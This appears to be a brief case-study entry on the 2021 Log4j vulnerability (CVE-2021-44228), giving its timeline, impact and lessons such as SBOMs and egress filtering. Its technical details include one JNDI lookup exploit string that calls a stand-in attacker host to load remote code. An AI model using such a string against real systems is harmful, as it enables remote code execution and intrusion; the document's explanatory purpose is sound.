# Log4j / CVE-2021-44228 (2021)

## Overview

A critical remote code execution vulnerability in Apache Log4j, a ubiquitous Java logging library, allowed attackers to execute arbitrary code by sending a specially crafted log message. The vulnerability affected millions of applications worldwide.

## Timeline

- **Nov 24, 2021**: Vulnerability reported to Apache by Alibaba Cloud security team
- **Dec 9, 2021**: Public disclosure and proof-of-concept exploit published
- **Dec 10, 2021**: Mass scanning and exploitation begins within hours
- **Dec 2021 - Jan 2022**: Multiple additional Log4j vulnerabilities discovered (CVE-2021-45046, CVE-2021-45105, CVE-2021-44832)

## Technical Details

- **Vulnerability**: JNDI (Java Naming and Directory Interface) lookup injection via log messages
- **Exploit string**: `${jndi:ldap://attacker.com/exploit}` — when logged by Log4j, triggers a remote class load and execution
- **CVSS Score**: 10.0 (Critical)
- **Affected versions**: Log4j 2.0-beta9 through 2.14.1

## Impact

- Embedded in millions of Java applications, often as a transitive dependency
- Many organizations did not know they were running vulnerable code
- Exploited by nation-state actors, ransomware groups, and cryptominers
- Highlighted the fragility of open-source dependency chains

## Lessons

- Organizations need Software Bills of Materials (SBOMs) to track all dependencies including transitive ones
- Critical open-source projects often lack adequate funding and security review
- Defense-in-depth (egress filtering, network segmentation) limits exploitation impact
